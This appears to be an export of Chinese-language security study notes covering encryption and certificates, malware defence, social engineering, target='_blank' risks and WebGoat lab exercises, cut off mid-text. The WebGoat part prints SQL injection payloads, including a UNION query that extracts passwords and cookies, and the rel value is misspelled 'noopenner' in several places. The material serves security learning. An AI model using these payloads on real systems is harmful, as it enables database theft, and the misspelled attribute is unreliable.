title=\"加密與電子憑證的直接連結\">​</a></h2><ul><li><strong>對稱加密</strong>：你知道如何加密，也知道如何解密。缺點是需要事前雙方先私下約定好。</li><li><strong>非對稱加密</strong>：相對於對稱來說，就是你即使知道怎麼加密的的方式，也不知道怎麼解密。也就是常用的公開金鑰加密。<ul><li>伺服器將公鑰（密碼箱）發送給客戶端</li><li>客戶端使用公鑰加密信息（鎖箱子）</li><li>伺服器接受客戶端傳來的消息後，使用私鑰（僅伺服器知道的密碼）解密</li></ul></li></ul><p>然而即使透過非對稱加密，有時候無法確保公鑰（密碼箱）的確是來自服務端的。於是我們需要<strong>被大家信任</strong>的人來給他們的密碼箱簽名從而確保身份的安全，也就是所謂的電子憑證：</p><ul><li>耶穌就是 Certification Authority，認證機構，被世人所信仰；</li><li>伺服器把自己的公鑰登錄到 CA，CA 會用自己的私鑰（秘術）給伺服器的公鑰加密生成簽名（個性說明）並頒發證書（保護膜），<strong>證書中包含對公鑰做的的簽名和伺服器的公鑰</strong>。（之所以 CA 要用「自己的私鑰」將「伺服器的公鑰」進行加密，是為了避免憑證被篡改）。</li><li>客戶端拿到消息後，會用瀏覽器內置的 CA 的公鑰（聖經，人人都有）對用私鑰做的簽名進行驗證，如果驗證通過表示安全，否則表示不安全。</li></ul><p>由於非對稱加密會影響傳輸速度，因為封包變大了，所以通常綜合性能和安全性考慮，會用<strong>「對稱加密」的方式來加密封包</strong>，<strong>用「非對稱加密」的方式來加密「對稱加密用的密鑰」</strong>。</p><div class=\"theme-admonition theme-admonition-note alert alert--secondary admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z\"></path></svg></span>備註</div><div class=\"admonitionContent_S0QG\"><p><strong>公鑰和私鑰是一對的</strong>，可以使用「公鑰加密」以「私鑰解密」，也可以使用「私鑰加密」以「公鑰解密」，並沒有哪把鑰匙才能加密或解密，<strong>真正的差別在於「公鑰是可以給其他人的」但「私鑰一定要自己保管好」</strong>。</p></div></div><div class=\"theme-admonition theme-admonition-note alert alert--secondary admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z\"></path></svg></span>備註</div><div class=\"admonitionContent_S0QG\"><p>在非對稱加密的應用中，可以讓 client 將訊息用（server 提供的）公鑰加密後，只有 server 的私鑰可以解密，目的是確保「<strong>訊息私密性</strong>」，只有 server 能看到訊息；或者也可以 server 用私鑰將訊息加密後，有公鑰的人都可把訊息解開，目的是確保「<strong>訊息合法性</strong>」，以此證明該訊息是由 server 發出的。</p></div></div><blockquote><p>⭐ 關於加密與電子證書推薦閱讀：<a href=\"https://zhuanlan.zhihu.com/p/33043251\" target=\"_blank\" rel=\"noopener noreferrer\">HTTPS 的故事</a> @ 知乎</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"防範惡意程式\">防範惡意程式<a href=\"#防範惡意程式\" class=\"hash-link\" aria-label=\"防範惡意程式的直接連結\" title=\"防範惡意程式的直接連結\">​</a></h2><p>若要防範惡意程式的侵犯，通常可以使用防毒軟體、防火牆、更嚴謹的話可以搭配 <strong>IDS（Intrusion Detection System，侵入檢測系統）</strong>和 <strong>IPS（Intrusion Prevention System，入侵防禦系統）</strong>，IDS 在偵測到異常行為時，會以電子郵件通報系統管理者；IPS 除了通報系統管理者外，亦會立即中斷異常連線。</p><p>偵測異常行為的方式主要包含<strong>以特徵偵測（Signature-based Detection）</strong>和<strong>異常型法偵測（Anomaly-based Detection）</strong>，前者類似以登錄過、建檔過的病毒碼進行比對，後者則是常用<strong>捷思法偵測（heuristic detection）</strong>，偵測程式運行中有無可疑行為來判斷。</p><p>防火牆和 IDS / IPS 不同之處在於，防火牆主要是根據 IP 位址和連接埠號從網路層（L3）和傳輸層（L4）著手；而 IDS / IPS 則更進一步含括到應用層（L5）。</p><p>除了防火牆和 IDS / IPS 外，對於小型網路也可以選擇 <strong>UTM（Unified Threat Management，集中式威脅管理）</strong>，它集結了防火牆、防毒、內容過濾、IPS 等功能。UTM 的成本較低廉，且容易管理，但可能導致網路效能較差。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"社交工程social-engineering\">社交工程（Social Engineering）<a href=\"#社交工程social-engineering\" class=\"hash-link\" aria-label=\"社交工程（Social Engineering）的直接連結\" title=\"社交工程（Social Engineering）的直接連結\">​</a></h2><p>社交工程（social engineering）指的是不透過電腦或網路等科技的漏洞，而是利用人與人之間的溝通與交談，達到竊取機密資訊的目的，例如，假的 LINE 貼圖下載活動以騙取個資、透過電話騙對方說自己是系統管理人員，以騙取帳號密碼、從提款機背後偷窺側錄使用者輸入密碼、從垃圾桶尋找機密文件等，都算在社交工程的防範範圍內。</p></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] target=&quot;_blank&quot; 的安全性風險 pjchender.dev": {
    "prefix": "hinternet [IS] target=&quot;_blank&quot; 的安全性風險 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] target=&quot;_blank&quot; 的安全性風險</h1></header><p><img loading=\"lazy\" src=\"../../../i.imgur.com/HEtDmnU.png\" alt=\"target blank security issue\" class=\"img_ev3q\"></p><p>在網頁撰寫的過程中，經常當我們要另開視窗時，很容易使用 <code>&lt;a target=&quot;_blank&quot;&gt;</code> 這樣的寫法，但如果你有使用 ESLint 的話，它會建議你在 a 標籤中要加上 <code>rel=&quot;noreferrer noopenner&quot;</code>，也就是：</p><div class=\"language-html codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-html codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">a</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">href</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">https://www.google.com</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">target</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">_blank</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\"> </span><span class=\"token tag attr-name\" style=\"color:rgb(255, 203, 107)\">rel</span><span class=\"token tag attr-value punctuation attr-equals\" style=\"color:rgb(199, 146, 234)\">=</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag attr-value\" style=\"color:rgb(255, 85, 114)\">noreferrer noopenner</span><span class=\"token tag attr-value punctuation\" style=\"color:rgb(199, 146, 234)\">&quot;</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><span class=\"token plain\"> Google </span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&lt;/</span><span class=\"token tag\" style=\"color:rgb(255, 85, 114)\">a</span><span class=\"token tag punctuation\" style=\"color:rgb(199, 146, 234)\">&gt;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>之所以要加上這行，是因為當瀏覽器使用 <code>target=&quot;_blank&quot;</code> 來打開新視窗時，新的視窗所在的網頁是有辦法透過 <code>window.opener</code> 這個物件來操作你原本的頁面。</p><p>舉例來說，當你在 A 站點了超連結另開新視窗到 B 站時，B 站可以在它的頁面中執行：</p><div class=\"language-js codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-js codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token dom variable\" style=\"color:rgb(191, 199, 213)\">window</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">opener</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">.</span><span class=\"token property-access\">location</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;https://www.google.com&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>這時候你會發現你在 A 站的網頁默默轉址到了 Google 的頁面。</p><p>這種做法主要是利用一般人只會注意新開的視窗（B 站），而忽略了原有的視窗（A 站），但若不進一步處理， 新開的視窗是有機會可以修改到原視窗內所瀏覽的網址的。</p><p>因此，若你使用的 <code>target=&quot;_blank&quot;</code> 的話，<a href=\"https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/jsx-no-target-blank.md\" target=\"_blank\" rel=\"noopener noreferrer\">eslint-plugin-react</a> 都會建議你要加上 <code>rel=&quot;noreferrer noopenner&quot;</code>，以確保使用者當前瀏覽的頁面，不會因為開新視窗後被另開的這個網站給影響。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://mathiasbynens.github.io/rel-noopener/\" target=\"_blank\" rel=\"noopener noreferrer\">About <code>rel=noopener</code></a></li><li><a href=\"https://web.dev/external-anchors-use-rel-noopener/\" target=\"_blank\" rel=\"noopener noreferrer\">Links to cross-origin destinations are unsafe</a> @ web.dev</li><li><a href=\"https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/\" target=\"_blank\" rel=\"noopener noreferrer\">Target=&quot;<!-- -->_<!-- -->blank&quot; - the most underestimated vulnerability ever</a></li><li><a href=\"https://stackoverflow.com/questions/50709625/link-with-target-blank-and-rel-noopener-noreferrer-still-vulnerable\" target=\"_blank\" rel=\"noopener noreferrer\">Link with target=“<!-- -->_<!-- -->blank” and rel=“noopener noreferrer” still vulnerable?</a> @ StackOverflow</li><li><a href=\"https://github.com/yannickcr/eslint-plugin-react/blob/master/docs/rules/jsx-no-target-blank.md\" target=\"_blank\" rel=\"noopener noreferrer\">Prevent usage of unsafe target=&#x27;<!-- -->_<!-- -->blank&#x27; (react/jsx-no-target-blank)</a> @ Github</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] WebGoat 學習筆記 pjchender.dev": {
    "prefix": "hinternet [IS] WebGoat 學習筆記 pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] WebGoat 學習筆記</h1></header><blockquote><p>此篇筆記是照著 <a href=\"https://ithelp.ithome.com.tw/articles/10206165\" target=\"_blank\" rel=\"noopener noreferrer\">來玩 webgoat</a> - <a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/2006\" target=\"_blank\" rel=\"noopener noreferrer\">資安補漏洞，越補越大洞</a> @ iThome 實作而來。</p></blockquote><blockquote><p><a href=\"https://www.owasp.org/index.php/Main_Page\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP</a>：包含各種資訊安全描述。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"安裝與啟動\">安裝與啟動<a href=\"#安裝與啟動\" class=\"hash-link\" aria-label=\"安裝與啟動的直接連結\" title=\"安裝與啟動的直接連結\">​</a></h2><ul><li><p>安裝 <a href=\"https://www.oracle.com/technetwork/java/javase/downloads/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">Java JDK</a></p></li><li><p>下載 <a href=\"https://github.com/WebGoat/WebGoat/releases\" target=\"_blank\" rel=\"noopener noreferrer\">webgoat-server</a> ( webwolf 也可在此下載 )</p></li><li><p>透過終端機安裝 webgoat</p></li></ul><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 啟動 webgoat server</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># java -jar webgoat-server-&lt;version&gt;.jar [--server.port=8080] [--server.address=localhost]</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">java -jar webgoat-server-8.0.0.VERSION.jar</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 啟動 webwolf server</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">java -jar webwolf-8.0.0.VERSION.jar [--server.port=9090] [--server.address=localhost]</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>接著就可以透過 <code>http://localhost:8080/WebGoat</code> 看到 WebGoat 登入頁面；<code>http://localhost:9090/WebWolf</code> 則可進入 WebWolf 登入頁。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"http-proxy\">HTTP Proxy<a href=\"#http-proxy\" class=\"hash-link\" aria-label=\"HTTP Proxy的直接連結\" title=\"HTTP Proxy的直接連結\">​</a></h2><p>許多時候 Proxy 是用來處理存取被阻擋的內容，使用者可能連上 server A，而 server A 的內容來自 server B，而使用者的網路（network）是無法直接存取到 server B 的內容。<strong>HTTP Proxies</strong> 是很類似的概念，它會接收從 client 的 request 然後轉發，通常還會紀錄（record）下來。</p><p>HTTP Proxies 就像中間人的角色，它介於 client 和 server 之間，它可以：</p><ul><li>記錄和分析（甚至修改）這些 request 和 response</li><li>更有效率地進行測試或分析網站的安全性</li><li>CI/CD</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"sql-injection\">SQL Injection<a href=\"#sql-injection\" class=\"hash-link\" aria-label=\"SQL Injection的直接連結\" title=\"SQL Injection的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"normal-sql-injection\">Normal SQL Injection<a href=\"#normal-sql-injection\" class=\"hash-link\" aria-label=\"Normal SQL Injection的直接連結\" title=\"Normal SQL Injection的直接連結\">​</a></h3><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"cheat-sheet\">cheat sheet<a href=\"#cheat-sheet\" class=\"hash-link\" aria-label=\"cheat sheet的直接連結\" title=\"cheat sheet的直接連結\">​</a></h4><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- string injection</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27; or &#x27;</span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27; = &#x27;</span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">1</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 利用註解來 injection</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">admin&#x27; </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 利用 UNION 搭配「註解」撈出另一個帶有密碼的 user_system_data 表，達到 SQL Inject</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27; UNION</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">SELECT userid, user_name, password, &#x27;</span><span class=\"token plain\">number</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;, &#x27;</span><span class=\"token keyword\" style=\"font-style:italic\">type</span><span class=\"token plain\">&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> cookie</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">,</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">0</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">FROM</span><span class=\"token plain\"> user_system_data </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">--</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p>「SQL Injection 就是利用程式的漏洞，利用 SQL 執行的錯誤語法，或是猜測資料庫結構或欄位名稱等，幫原本要執行的 SQL 語法加料，進而造成資料庫執行到被加料的 SQL 語法，並造成非預期的結果，像是資料被修改、外洩及刪除等，也有可能整個資料庫被刪除或多新增幾個帳號等，總之只要是 SQL 語法能做到的事情都有可能因此被執行」<a href=\"https://ithelp.ithome.com.tw/articles/10206740\" target=\"_blank\" rel=\"noopener noreferrer\">[Day 16] 來玩 WebGoat！之 4：SQL Injection</a> @ IThome</p></blockquote><p>利用字串插補（string interpolation）或字串連結（concatenating strings）的方式來撰寫「動態的」 SQL 語法非常容易遭到 SQL Injection：</p><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"string-and-numeric-injection\">String and Numeric Injection<a href=\"#string-and-numeric-injection\" class=\"hash-link\" aria-label=\"String and Numeric Injection的直接連結\" title=\"String and Numeric Injection的直接連結\">​</a></h4><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"string-based\">String Based<a href=\"#string-based\" class=\"hash-link\" aria-label=\"String Based的直接連結\" title=\"String Based的直接連結\">​</a></h5><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> users </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> name </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;&quot; + userName + &quot;&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- username 帶入 userName = Smith&#x27; or &#x27;1&#x27;=&#x27;1</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\">-- 即可把所有資料撈出來</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token keyword\" style=\"font-style:italic\">select</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">*</span><span class=\"token plain\"> </span><span class=\"token keyword\" style=\"font-style:italic\">from</span><span class=\"token plain\"> users </span><span class=\"token keyword\" style=\"font-style:italic\">where</span><span class=\"token plain\"> name </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;Smith&#x27;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">or</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;1&#x27;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">=</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&#x27;1&#x27;</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h5 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"numeric-based\">Numeric Based<a href=\"#numeric-based\" class=\"hash-link\" aria-label=\"Numeric Based的直接連結\" title=\"Numeric Based的直接連結\">​</a></h5><div class=\"language-sql codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sql codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;select * from users where employee_id = &quot;</span><span class=\"token plain\"> </span><span class=\"token operator\" style=\"color:rgb(137, 221, 255)\">+</span><span class=\"token plain\"> userID</span><span class=\"token punctuation\" style=\"color:rgb(199, 146, 234)\">;</span><span class=\"token plain\"></span><br></span><span 